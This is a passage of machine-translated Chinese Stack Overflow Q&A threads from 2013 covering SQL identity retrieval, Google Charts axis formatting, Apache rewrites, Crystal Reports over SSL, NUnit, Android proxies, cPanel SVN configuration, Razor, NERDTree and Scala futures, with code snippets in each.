虽然我很欣赏我可能应该`SCOPE_IDENTITY`在这里使用（我会在一分钟内尝试），但我的印象是`SERIALIZABLE`交易会阻止这种情况发生。有谁知道为什么会发生这种重复，是否`SCOPE_INDENTITY`会解决问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:23:51.323

您肯定需要使用 SCOPE_IDENTITY，但在与 INSERT 相同的查询中。当 2 个客户端同时在同一个表中插入数据时 -> 第二个查询将返回第二个插入值的 Max(id)。

```
INSERT INTO [MySchema].[dbo].[MyTable] (NOTES) VALUES ('sometext')
SELECT SCOPE_IDENTITY() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:27:18.427

最简单的方法是使用以下命令打开记录集，而无需先前执行

```
INSERT INTO [MySchema].[dbo].[MyTable] (NOTES) 
OUTPUT inserted.id
VALUES ('sometext') 
```

# css - 在项目中找不到课程

> ID：15154225
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:16:43.563
> 
> 标签：css, asp.net-mvc, asp.net-mvc-3

我正在尝试在整个解决方案中搜索 class="reports-submenu"，但它不会显示在任何文件中。我以为它会出现在 CSS 文件中，但没有找到。我用“报告子菜单”快速查找，没有任何显示

```
<li style="visibility: hidden; display: none" id="ReportLi"><a id="MainReport"  
style="visibility: visible">
                    Reports</a> <span class="reports-submenu">
                        @Html.ActionLink("My Reports", "Index", new { controller = 
"Report" }, new { id = "Reports1", @style = "visibility:hidden;display:none" })
                        @Html.ActionLink("Standard Reports", "ReportStandard", new { 
controller = "Report" }, new { id = "Report2", @style = "visibility:hidden;display:none" 
})                           
                    </span></li> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:18:35.950

我想你已经在你的视野中找到了它。

仅仅因为它在视图中使用并不意味着它是在一个 css 文件中定义的。也许有人从 CSS 文件中删除它并忘记从视图中删除它？

# javascript - 在 Google 折线图中设置 vAxis 格式

> ID：15154226
> 
> 赞同：1
> 
> 时间：2013-03-01T09:16:44.710
> 
> 标签：javascript, google-visualization

如何在谷歌折线图中设置 vAxis 值格式，以免获得具有相同值的多条线？假设我有值的行：1.5 1.0 0.5 和 0，在我将格式设置为“#”后，我得到了 0、0、1、1...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T12:12:28.273

[此问题](https://stackoverflow.com/questions/14440231/google-charts-vertical-axis-in-whole-numbers/14472345#14472345)可能重复

复制粘贴答案：

> 如果您只想将数字*显示*为整数，那么很容易：
> 
> ```
> function drawVisualization() {
>   // Create and populate the data table.
>   var data = google.visualization.arrayToDataTable([
>     ['x', 'Cats', 'Blanket 1', 'Blanket 2'],
>     ['A',   1,       1,           0.5],
>     ['B',   2,       0.5,         1],
>     ['C',   4,       1,           0.5],
>     ['D',   8,       0.5,         1],
>     ['E',   7,       1,           0.5],
>     ['F',   7,       0.5,         1],
>     ['G',   8,       1,           0.5],
>     ['H',   4,       0.5,         1],
>     ['I',   2,       1,           0.5],
>     ['J',   3.5,     0.5,         1],
>     ['K',   3,       1,           0.5],
>     ['L',   3.5,     0.5,         1],
>     ['M',   1,       1,           0.5],
>     ['N',   1,       0.5,         1]
>   ]);
> 
>   // Create and draw the visualization.
>   new google.visualization.LineChart(document.getElementById('visualization')).
>       draw(data, {curveType: "function",
>                   width: 500, height: 400,
>                   vAxis: {maxValue: 10, format: '0'}}
>           );
> } 
> ```
> 
> 如果你去 [google playground][1] 你会注意到轴标签是 0, 2.5, 5, 7.5, 10。通过向 vAxis 添加格式：'0'，它将只显示整数，所以我的标签变为 0、3、5、8、10。但显然这并不理想，因为 8 显示为介于 5 和 10 之间，但事实并非如此，因为数字实际上是 7.5 并且只是四舍五入。
> 
> 您更改轴刻度/标签的能力受到限制。并且按照您的要求做一些特殊的 javascript 来创建适当的比例和数量的网格线，以防止将事情分解成时髦的数字。
> 
> 基本上，您要确保您的最大值和最小值以及网格线的数量允许轻松划分，这样您只会得到整数。为此，您需要创建一些时髦的新逻辑。这是一些示例代码，可让您获得适当的最小/最大轴值：
> 
> ```
> // Take the Max/Min of all data values in all graphs
> var totalMax = 345;
> var totalMin = -123;
> 
> // Figure out the largest number (positive or negative)
> var biggestNumber = Math.max(Math.abs(totalMax),Math.abs(totalMin));
> 
> // Round to an exponent of 10 appropriate for the biggest number
> var roundingExp = Math.floor(Math.log(biggestNumber) / Math.LN10);
> var roundingDec = Math.pow(10,roundingExp);
> 
> // Round your max and min to the nearest exponent of 10
> var newMax = Math.ceil(totalMax/roundingDec)*roundingDec;
> var newMin = Math.floor(totalMin/roundingDec)*roundingDec;
> 
> // Determine the range of your values
> var range = newMax - newMin;
> 
> // Define the number of gridlines (default 5)
> var gridlines = 5;
> 
> // Determine an appropriate gap between gridlines
> var interval = range / (gridlines - 1);
> 
> // Round that interval up to the exponent of 10
> var newInterval = Math.ceil(interval/roundingDec)*roundingDec;
> 
> // Re-round your max and min to the new interval
> var finalMax = Math.ceil(totalMax/newInterval)*newInterval;
> var finalMin = Math.floor(totalMin/newInterval)*newInterval; 
> ```
> 
> 这里有几个问题（不幸的是）。第一个是我使用网格线的数量来确定最小/最大值——你想弄清楚你应该有多少网格线来使用漂亮的整数。我认为最简单的方法如下（仅限伪代码）：
> 
> ```
> // Take the Max/Min of all data values in all graphs
> var totalMax = 3;
> var totalMin = -1;
> 
> // Figure out the largest number (positive or negative)
> var biggestNumber = Math.max(Math.abs(totalMax),Math.abs(totalMin));
> 
> // Round to an exponent of 10 appropriate for the biggest number
> var roundingExp = Math.floor(Math.log(biggestNumber) / Math.LN10);
> var roundingDec = Math.pow(10,roundingExp);
> 
> // Round your max and min to the nearest exponent of 10
> var newMax = Math.ceil(totalMax/roundingDec)*roundingDec;
> var newMin = Math.floor(totalMin/roundingDec)*roundingDec;
> 
> // Determine the range of your values
> var range = newMax - newMin;
> 
> // Calculate the best factor for number of gridlines (2-5 gridlines)
> // If the range of numbers divided by 2 or 5 is a whole number, use it
> for (var i = 2; i <= 5; ++i) {
>     if ( Math.round(range/i) = range/i) {
>         var gridlines = i
>     }
> } 
> ```
> 
> 然后将网格线选项 (vAxis.gridlines) 设置为上述变量，将 max 设置为 newMax，将 min 设置为 newMin。那应该给你整数轴标签。
> 
> 注意：如果您的数字非常小，则上述功能可能不起作用。该功能也未经过测试，因此请根据您自己的时间检查一些示例，如果它不能正常工作，请告诉我。
> 
> [1]： [http ://code.google.com/apis/ajax/playground/?type=visualization#line_chart](http://code.google.com/apis/ajax/playground/?type=visualization#line_chart)

# apache - 编码 URL 的 RewriteRule (%2F)

> ID：15154227
> 
> 赞同：0
> 
> 时间：2013-03-01T09:16:47.083
> 
> 标签：apache, mod-rewrite

我有一个看起来很愚蠢的问题，但我还没有找到答案。我有一个上传服务器和一个 UploadServlet。以前路由`{server}/upload/(filename.txt)`就像一个魅力，现在我们正在编码编码字符的路径，`/`如果`%2F`文件路径是 =`/xcv`现在变成 =`%2Fxcv`并且这不会重新路由到我想要的 servlet。是否有任何简单的标志设置或我在这里缺少的东西来避免这种情况，或者我是否必须使用全新的重写规则，如果是这样，为什么这个简单的规则不起作用？

```
RewriteRule ^/fileupload?$ [F]
RewriteRule ^/fileupload(.*)$ /(server)/$1 [PT, L] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-03T02:32:29.970

显然 %2F 似乎仅在查询字符串中使用时才有效。您可以通过将 %2F 的所有实例替换为 %252F 来解决此问题。

# azure - Crystal Reports 通过 HTTP 工作，但不能通过 HTTPS

> ID：15154231
> 
> 赞同：1
> 
> 时间：2013-03-01T09:17:01.347
> 
> 标签：azure, https, crystal-reports

我已经搜索了每个地方（我认为），但我一直无法找到答案，也许是因为它太初级了，但这里就可以了。我最近将 Silverlight 业务应用程序部署到 Windows Azure 平台。我正在使用 Crystal Reports 进行报告，一切正常。我需要在 SSL 中运行该应用程序，因此我购买了一个证书并按照说明启动并运行该应用程序，除报告外，一切正常。当我通过 http 访问该站点时，打印报告没有问题。但是当我尝试打印报告时，通过 https 我得到以下信息：

> 不支持的操作。JRC 引擎处理的文档无法在 C++ 堆栈中打开。

描述：

> 当前 Web 请求执行期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详情：

> System.Runtime.InteropServices.COMException：不支持的操作。JRC 引擎处理的文档无法在 C++ 堆栈中打开。

源错误：

> 在执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪来识别有关异常起源和位置的信息。

堆栈跟踪：

```
[COMException (0x80041811): Unsupported Operation. A document processed by the JRC engine cannot be opened in the C++ stack.]
   CrystalDecisions.ReportAppServer.ClientDoc.ReportClientDocumentClass.Open(Object& DocumentPath, Int32 Options) +0
   CrystalDecisions.ReportAppServer.ReportClientDocumentWrapper.Open(Object& DocumentPath, Int32 Options) +147
   CrystalDecisions.ReportAppServer.ReportClientDocumentWrapper.EnsureDocumentIsOpened() +422
[CrystalReportsException: Load report failed.]
   CrystalDecisions.ReportAppServer.ReportClientDocumentWrapper.EnsureDocumentIsOpened() +549
   CrystalDecisions.CrystalReports.Engine.ReportDocument.Load(String filename, OpenReportMethod openMethod, Int16 parentJob) +1613
   CrystalDecisions.CrystalReports.Engine.ReportDocument.Load(String filename) +189
   COCOBOLO.Web.Files.ReportHandler1.MeetingMinutes() +247
   COCOBOLO.Web.Files.ReportHandler1.Page_Load(Object sender, EventArgs e) +2392
   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
   System.Web.UI.Control.LoadRecursive() +71
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064 
```

我几乎可以肯定使用带有 SSL 的 Crystal Reports 存在权限问题，但我不知道该怎么做。有人遇到过这个问题吗？请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T03:05:16.873

由于您的堆栈跟踪显示加载报告失败，我要做的第一件事是检查您的项目中是否有报告并且您的代码能够访问该报告。我知道使用 HTTP 一切正常。此外，请确保您对存储报告的文件夹具有读写权限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-29T08:05:39.517

问题不在您的水晶报告中。问题是因为 ssl 不想加载 pdf 文件。

[使用基于 ssl/https 在 iframe 中显示 pdf](https://stackoverflow.com/questions/35072620/display-pdf-in-iframe-using-ssl-https-based)

您可以尝试在 chrome 商店中下载 pdf 查看器，它适用于 ssl 和我。

最良好的问候。

# c# - NUnit ITest“属性”字段：用户可以设置吗？

> ID：15154232
> 
> 赞同：1
> 
> 时间：2013-03-01T09:17:01.647
> 
> 标签：c#, unit-testing, nunit

所以我设置了这个场景：

```
private void InitializeTestProperties()
{
    SetTestPropertiesRecur(mTestRunner.Test, "Show", true);
    VerifyPropertiesRecur(mTestRunner.Test, "Show");
} 
```

我期望加载到“mTestRunner”中的所有测试都将存储在 ITest 提供的字典中的属性“Show”设置为“true”。

执行此代码时，ITest 的“属性”字段似乎设置了正确的值：

```
private void SetTestPropertiesRecur(ITest test, object key, object val)
{
    test.Properties[key] = val;
    Console.WriteLine(test.TestName.FullName + ": " + test.Properties[key]); // works
    if (test.IsSuite)
    {
        foreach (ITest child in test.Tests)
        {
            SetTestPropertiesRecur(child, key, val);
        }
    }
} 
```

但是，当我尝试通过另一个函数进行验证时，“属性”字段不会再次设置。

```
private void VerifyPropertiesRecur(ITest test, object key)
{
    Console.WriteLine(test.TestName.FullName + ": " + test.Properties[key]); // does not print the right value. "test.Properties[key]" has nothing associated with it for all tests.
    if (test.IsSuite)
    {
        foreach (ITest child in test.Tests)
        {
            VerifyProperties(child, key);
        }
    }
} 
```

总之，对 ITest 的“属性”字段所做的更改不会在函数调用中持续存在。为什么？如何使更改持久化？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T02:47:04.517

好吧，我查看了 ITest 的组合，发现“属性”字段是只读属性。

```
using System;
using System.Collections;
namespace NUnit.Core
{
    public interface ITest
    {
        TestName TestName
        {
            get;
        }
        string TestType
        {
            get;
        }
        RunState RunState
        {
            get;
            set;
        }
        string IgnoreReason
        {
            get;
            set;
        }
        int TestCount
        {
            get;
        }
        IList Categories
        {
            get;
        }
        string Description
        {
            get;
            set;
        }
        IDictionary Properties
        {
            get;
        }
        bool IsSuite
        {
            get;
        }
        ITest Parent
        {
            get;
        }
        IList Tests
        {
            get;
        }
        int CountTestCases(ITestFilter filter);
    }
} 
```

谜团已揭开！

# android - 以编程方式设置代理用户名和密码 Android

> ID：15154235
> 
> 赞同：3
> 
> 时间：2013-03-01T09:17:19.087
> 
> 标签：android, https, proxy

目前我正在开发一个应用程序，我想向代理服务器后面的服务器发送请求。我找到了设置代理的代码，如下所示

```
HttpHost httpproxy = new HttpHost("ip",8080);
httpclient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, httpproxy); 
```

现在我想设置用户名和密码。有谁知道如何设置代理的用户名和密码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:16:21.990

为此，您必须使用凭据：

```
DefaultHttpClient httpclient = new DefaultHttpClient();
httpclient.getCredentialsProvider().setCredentials(
new AuthScope("PROXY HOST", 8080),
new UsernamePasswordCredentials("your_username", "your_password"));
HttpHost targetHost = new HttpHost("TARGET HOST", 443, "https");
HttpHost proxy = new HttpHost("PROXY HOST", 8080);
httpclient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy); 
```

但在我看来，这是一种非常不安全的方式！您必须将密码保存在您的 android 客户端上的任何位置。脚本小子很容易确定该密码。

# .htaccess - .htaccess HTTPD 配置 和

> ID：15154238
> 
> 赞同：1
> 
> 时间：2013-03-01T09:17:35.390
> 
> 标签：.htaccess, apache2, centos, cpanel, httpd.conf

叹息......好吧，我已经在这几个小时了。这是我所拥有的：

```
Centos 6.3
WHM (cPanel) 11.34.1
Apache 2.2
Subversion + mod_dav_svn 
```

如果您不知道，请注意 WHM (cPanel) 管理 httpd.conf 并会在需要时覆盖它。我们可以使用包含 .conf 文件，这些文件会在 httpd.conf 期间的某些点被包含在内

使用帐户“Website.com”我登录到它的 cPanel 并创建了一个子域“server.website.com”。服务器上的用户位置是/home/websitecom，子域位置是/home/websitecom/server。

我在这里有颠覆存储库：/svn/repos/rp1 等。我将其添加到我的 conf

```
<Location /svn/repo1>
    DAV svn
    SVNPath /svn/repos/rp1
</Location> 
```

极好的！效果很好但是，位置 /svn/repo1 在服务器上的所有主机上都可用，因为该`<location>`指令正在读取服务器范围内的 REQUEST_URI。

**我想要的只是将`<location>`指令限制为 server.website.com 域......！！！**这有那么难吗？

在我正在使用的 WHM 中`pre_virtualhost_global.conf`（在虚拟主机声明之前包含在内）并且我尝试过：

```
<directory /home/websitecom/server>
    <location /svn/repo1>
        DAV svn
        SVNPath /svn/repos/rp1
    </location>
</directory> 
```

我明白了`"location is not allowed here"`

我努力了：

```
<location /svn/repo1>
    Require host server.website.com
    DAV svn
    SVNPath /svn/repos/rp1
</location> 
```

我明白了`couldn't perform authentication. AuthType not set!`

我努力了

```
<virtualhost server.website.com:80>
    <location /svn/repo1>
        DAV svn
        SVNPath /svn/repos/rp1
    </location>
</virtualhost> 
```

没有警告，`service httpd restart`但它只是不起作用

***请让我知道如何实现`<location>`特定于主机......我想要实现的是：***

```
<location /svn/repo1>
    HOST www.example.com
</location> 
```

在共享命名主机环境中

**更新**

我也试过.htaccess：

```
<location /svn/repo1>
    DAV svn
    SVNPath /svn/repos/rp1
</location> 
```

错误 500 服务器错误*“此处不允许位置”*

**更新**

我已经更正了 Auth 用法：

```
AuthType Basic
Require host server.website.com
AuthName "Repository Authentication"
AuthUserFile /svn/repos/rp1.htpasswd
Require valid-user 
```

密码验证有效，但 Require host server.website.com 似乎没有做任何事情！？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T12:42:40.610

哈！！！

我在 httpd.conf 中找到了这个

```
# To customize this VirtualHost use an include file at the following location
Include "/usr/local/apache/conf/userdata/std/2/--USER--/--HOST--/*.conf" 
```

于是我在“/usr/local/apache/conf/userdata/std/2/--USER--/--HOST--/svn.conf”中创建了一个文件，内容：

```
<location /svn/repo1>
    DAV svn
    SVNPath /svn/repos/rp1
</location> 
```

这在 cPanel WHM 的上下文中解决了这个问题，但是在基本的 centos apache 服务器上，我仍然想知道是否

```
<virtualhost server.website.com:80>
    <location /svn/repo1>
        DAV svn
        SVNPath /svn/repos/rp1
    </location>
</virtualhost> 
```

还能用吗！？无论如何，目前对我来说不是问题......

# c# - 考虑 foreach 循环中的布尔值

> ID：15154239
> 
> 赞同：0
> 
> 时间：2013-03-01T09:17:37.260
> 
> 标签：c#, asp.net-mvc, razor, asp.net-mvc-4

对于我期望的人来说，这应该是一些简单的点，但是作为一个前端开发人员试图以零 C# 的先验知识来掌握 MVC 剃须刀，这让我很难过。

我有一个布尔变量`hasSecond`，我想在下面考虑`foreach`：

```
@foreach (PODO_AcceptRejectReasons reason in reasonList2.Where(e => e.Type == 1))
    {
        <option data-confirm-type="1" data-confirm-attr="@reason.Attribute" value="@reason.ID">@reason.Text</option>
    } 
```

我只想在 is 时显示值为 'SECOND' 的选项，`@reason.Atrribute`否则不显示这些选项。`hasSecond``true`

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:21:28.167

```
@foreach (PODO_AcceptRejectReasons reason in reasonList2.Where(e => e.Type == 1))
    {
        if(hasSecond||reason.Attribute!="SECOND")
        {
            <option data-confirm-type="1" data-confirm-attr="@reason.Attribute" value="@reason.ID">@reason.Text</option>
        }
    } 
```

应该做的伎俩。我想我之前的逻辑有点错误。这将显示所有`option`s where `reason.Attribute`is not `SECOND`。如果*是* `SECOND`，它只会显示`option`如果`hasSecond`为真。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:21:59.500

只需将其添加到 Where 语句中：

```
@foreach (PODO_AcceptRejectReasons reason in reasonList2.Where(e => e.Type == 1 && hasSecond))
    {
        <option data-confirm-type="1" data-confirm-attr="@reason.Attribute"   value="@reason.ID">@reason.Text</option>
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:19:40.987

您可以通过以下方式执行此操作，只需在 foreach 循环中放置一条 if 语句并在 where 中添加另一个子句。

```
@foreach (PODO_AcceptRejectReasons reason in reasonList2.Where(e => e.Type == 1 && e.Attribute=="SECOND"))
{
    if(hasSecond)
    {
        <option data-confirm-type="1" data-confirm-attr="@reason.Attribute" value="@reason.ID">@reason.Text</option>
    }
} 
```

如果您只想`data-confirm-attr="@reason.Attribute"`删除 if`hasSecond`为 false，则可以使用以下命令：

```
@foreach (PODO_AcceptRejectReasons reason in reasonList2.Where(e => e.Type == 1))
{
    <option data-confirm-type="1" @if(hasSecond) { <text>data-confirm-attr="@reason.Attribute"</text> } value="@reason.ID">@reason.Text</option>
} 
```

# android - 从源代码构建 Titanium Mobile SDK 时出错

> ID：15154240
> 
> 赞同：1
> 
> 时间：2013-03-01T09:17:38.237
> 
> 标签：android, titanium, titanium-mobile, scons, titanium-modules

我从github下载了钛移动sdk的源代码。我在 Windows 7 中安装了 python、scons、jdk 和 android sdk。我在环境变量中设置了 java、android sdk 等的路径。但是在使用 scons 编译时，会出现以下错误。

```
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Shihab>cd  C:\Project\titanium_mobile

C:\Project\titanium_mobile>scons
scons: Reading SConscript files ...
Building MobileSDK version 3.1.0, githash 2d79a72
KeyError: 14:
  File "C:\Project\titanium_mobile\SConstruct", line 115:
    sdk = AndroidSDK(ARGUMENTS.get("android_sdk", None), 14)
  File "C:\Project\titanium_mobile\support\android\androidsdk.py", line 49:
    self.set_api_level(api_level)
  File "C:\Project\titanium_mobile\support\android\androidsdk.py", line 53:
    self.find_platform_dir()
  File "C:\Project\titanium_mobile\support\android\androidsdk.py", line 127:
    old_style_dir = os.path.join(self.android_sdk, 'platforms', android_api_leve
ls[api_level])

C:\Project\titanium_mobile> 
```

如何解决此错误？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-15T08:04:42.750

[这个论坛帖子](http://developer.appcelerator.com/question/140526/solution-application-installer-abnormal-process-termination)说**KeyError: NN**表示未找到 Android API 版本 NN。你有那个特定的版本吗？（API 14 == Android 4.0）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T16:28:26.297

为什么不直接下载 Titanium Studio？从 appcelerator 页面，您可以尝试在那里创建一个项目，看看您是否正确地进行了所有配置

# c# - 什么是本地变量（在 CountdownEvent 类的 MSDN 代码示例中）？

> ID：15154243
> 
> 赞同：3
> 
> 时间：2013-03-01T09:17:53.770
> 
> 标签：c#, multithreading, delegates, lambda, anonymous

在 MSDN 文章[CountdownEvent 类](http://msdn.microsoft.com/en-us/library/system.threading.countdownevent%28v=vs.100%29.aspx)代码示例（如下）中，变量是干什么用的
？`local`

```
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
class CDESample
{
    // Demonstrates:
    //      CountdownEvent construction
    //      CountdownEvent.AddCount()
    //      CountdownEvent.Signal()
    //      CountdownEvent.Wait()
    //      CountdownEvent.Wait() w/ cancellation
    //      CountdownEvent.Reset()
    //      CountdownEvent.IsSet
    //      CountdownEvent.InitialCount
    //      CountdownEvent.CurrentCount
    static void Main()
    {
        // Initialize a queue and a CountdownEvent
        ConcurrentQueue<int> queue = new ConcurrentQueue<int>(Enumerable.Range(0, 10000));
        CountdownEvent cde = new CountdownEvent(10000); // initial count = 10000

        // This is the logic for all queue consumers
        Action consumer = () =>
        {
            int local;
            // decrement CDE count once for each element consumed from queue
            while (queue.TryDequeue(out local)) cde.Signal();
        };

        // Now empty the queue with a couple of asynchronous tasks
        Task t1 = Task.Factory.StartNew(consumer);
        Task t2 = Task.Factory.StartNew(consumer);

        // And wait for queue to empty by waiting on cde
        cde.Wait(); // will return when cde count reaches 0

        Console.WriteLine("Done emptying queue.  InitialCount={0}, CurrentCount={1}, IsSet={2}",
            cde.InitialCount, cde.CurrentCount, cde.IsSet);

        // Proper form is to wait for the tasks to complete, even if you that their work
        // is done already.
        Task.WaitAll(t1, t2);

        // Resetting will cause the CountdownEvent to un-set, and resets InitialCount/CurrentCount
        // to the specified value
        cde.Reset(10);

        // AddCount will affect the CurrentCount, but not the InitialCount
        cde.AddCount(2);

        Console.WriteLine("After Reset(10), AddCount(2): InitialCount={0}, CurrentCount={1}, IsSet={2}",
            cde.InitialCount, cde.CurrentCount, cde.IsSet);

        // Now try waiting with cancellation
        CancellationTokenSource cts = new CancellationTokenSource();
        cts.Cancel(); // cancels the CancellationTokenSource
        try
        {
            cde.Wait(cts.Token);
        }
        catch (OperationCanceledException)
        {
            Console.WriteLine("cde.Wait(preCanceledToken) threw OCE, as expected");
        }

        // It's good for to release a CountdownEvent when you're done with it.
        cde.Dispose();

    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:21:26.383

TryDequeue 需要 T 类型的 out 参数。T 是队列的类型。本地参数将填充您刚刚为队列删除的对象。可用于进一步加工。请参阅[http://msdn.microsoft.com/en-us/library/dd287208.aspx](http://msdn.microsoft.com/en-us/library/dd287208.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:19:41.280

我想这只是因为该方法`TryDequeue()`有一个int类型的参数，即使你不使用它也必须给它一个。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T09:29:20.487

从[`ConcurrentQueue<T>.TryDequeue`](http://msdn.microsoft.com/en-us/library/dd287208.aspx)

> 尝试在并发队列的开头删除并返回对象。

```
public bool TryDequeue(
    out T result
)

Parameters
result
Type: T
When this method returns, if the operation was successful, result contains the object removed. If no object was available to be removed, the value is unspecified. 
```

`T`是您的队列类型。如果您想知道该怎么`out`做，请从[`MSDN`](http://msdn.microsoft.com/en-us/library/t3c3bfhx%28v=vs.80%29.aspx).

当`queue.TryDequeue(out local)`方法返回时`true`，您的`cde.Signal()`方法将继续处理。

# android - Android如何知道上下文菜单何时完全呈现

> ID：15154246
> 
> 赞同：1
> 
> 时间：2013-03-01T09:18:07.717
> 
> 标签：android, android-contextmenu

在 Android 中，当用户想要显示上下文菜单时，他们需要长按某些控件。之后，`onCreateContextMenu`运行回调以在屏幕上创建上下文菜单。但是有没有听众知道上下文菜单何时完全呈现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:44:41.127

```
public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {  
    menu.add(0, v.getId(), 0, "Something");
    menu.add(0, v.getId(), 0, "Something else");  
} 
```

这里 menu.add 将返回 MenuItem 并且最后一个菜单项将指示上下文菜单已完全呈现。

# android - 如果用户从共享列表中选择我的应用程序，如何处理活动中的参数？

> ID：15154252
> 
> 赞同：0
> 
> 时间：2013-03-01T09:18:19.780
> 
> 标签：android, list, sharing

现在，当用户从 android 手机上的 gmail 帐户单击电子邮件地址时，我可以在默认共享应用程序列表中显示我的 android 应用程序。

但是我怎样才能在我的应用程序中获取电子邮件地址？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:20:05.380

阅读[共享内容培训](http://developer.android.com/training/sharing/index.html)，特别是[处理传入内容](http://developer.android.com/training/sharing/receive.html#handling-content)。

```
String sharedText = intent.getStringExtra(Intent.EXTRA_EMAIL); 
```

# vim - 在 Vim 中设置 nerdTree

> ID：15154257
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:18:28.520
> 
> 标签：vim, nerdtree

我正在尝试为我的 vim 编辑器安装 nerdTree。到目前为止，我能够从[github](https://github.com/scrooloose/nerdtree)下载源代码到`.vim/bundle`.

但是在[下面的视频](http://net.tutsplus.com/tutorials/other/vim-essential-plugin-nerdtree/)中，他们通过命令安装了 nerdTree `rake`，但在最新的 git repo 中没有 rake 文件。

我尝试按照新的 README 文件，将插件复制到 .vim/bundle。现在它可以工作了，但是当我选择一个节点时，它会以全屏方式打开，关闭 nerdTree。

根据[常见问题解答](https://github.com/scrooloose/nerdtree#faq)，我在 ~/.vimrc 文件中添加了以下行，但没有运气。

```
autocmd vimenter * if !argc() | NERDTree | endif 
```

如何设置 nerdTree，当我打开一个目录时，我希望目录结构始终位于屏幕的左侧。（就像在文本中一样）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T22:47:08.160

[NERDTree 文档](https://github.com/scrooloose/nerdtree/blob/master/doc/NERD_tree.txt)

看起来该`NERDTreeQuitOnOpen`选项可能已打开。试着把它放在你的 vimrc 中：

```
let NERDTreeQuitOnOpen=0 
```

# scala - Scala 中的 TraversableOnce、Future 和 Option 用于理解

> ID：15154259
> 
> 赞同：8
> 
> 时间：2013-03-01T09:18:42.763
> 
> 标签：scala, monads, future

我有一个代表数据库记录的字符串 id 列表。我想从数据库异步加载它们，然后将每条记录异步上传到远程服务器，然后当所有上传完成后，记录上传记录的 ID。

由于我使用的是 Scala 2.9.2，因此我使用的是 Twitter 的 core-util Future 实现，但它在 Monadic 转换方面应该与 2.10 的 future 完全一样。

一般概念是这样的：

```
def fetch(id: String): Future[Option[Record]]
def upload(record: Record): Future[String]
def notifyUploaded(ids: Seq[String]): Unit

val ids: Seq[String] = .... 
```

我试图通过理解来做到这一点，但 fetch 返回选项的未来这一事实使它变得模糊并且代码无法编译：

```
for {
  id <- ids
  maybeRecord <- fetch(id)
  record <- maybeRecord
  uploadedId <- upload(record)
} yield uploadedId 
```

编译它会导致以下错误：

```
scala: type mismatch;
found   : com.twitter.util.Future[String]
required: Option[?]
    uploadedId <- upload(record)
                  ^ 
```

我错过了什么？为什么编译器期望 uploadId 是一个选项？有什么漂亮的方法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T09:59:36.260

考虑`flatMap`（或绑定）函数的签名：

```
trait Monad[M[_]] {
  def flatMap[A](a : M[A], f : A => M[B]) : M[B]
  .... 
```

在您的情况下，您尝试`flatMap`在 an 上使用`Option`，给它一个`f`生成一个`Future`. 但就像上面的签名一样，`f`应该在调用它的同一个 monad 中生成一些东西。

Scala 在这方面不一定很有帮助，因为它非常擅长转换周围的事物（`Seq`例如，转换为 s），这样您就可以将任意`flatMap`调用链接在一起，而不管容器如何。

你可能想要的是一个“Monad 转换器”，它可以让你有一些编写 monad 的能力。[Debasish Ghosh 在这里](http://debasishg.blogspot.co.uk/2011/07/monad-transformers-in-scala.html)有一篇关于使用 Scalaz monad 转换器的文章。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-22T17:55:14.670

您不能将所有不同的类型混合在一起以进行理解，我发现您可能会混合 Seq 和 Option 并且结果将是 Seq 或 Option 取决于首先是什么。不能混合 Future 和 Seq 或 Option。如果您想使用理解功能，则必须将它们级联一些。在这种情况下，使用 map/flatMap 可能会更好。我以两种方式实现了您的问题，并向少数中间结果添加了类型，以便您看到在使用所有不同类型时创建的混乱。

```
object TestClass {

  import scala.concurrent.Future
  import scala.concurrent.ExecutionContext.Implicits.global
  import scala.concurrent._
  import scala.concurrent.duration._

  case class Record(id: String)

  def fetch(id: String): Future[Option[Record]] = Future {
    Thread.sleep(1000);
    Some(Record(id))
  }

  def upload(record: Record): Future[String] = Future {
    Thread.sleep(3000);
    record.id + "_uploaded"
  }

  def notifyUploaded(ids: Seq[String]): Unit = println("notified" + ids)

  val ids: Seq[String] = Seq("a", "b", "c")

  def main(args: Array[String]): Unit = {
    forComprehensionImpl()
    mapAndFlatMapImpl()
  }

  def forComprehensionImpl() = {
    val result: Seq[Future[Option[Future[String]]]] = for {
      id <- ids
    } yield {
      for {
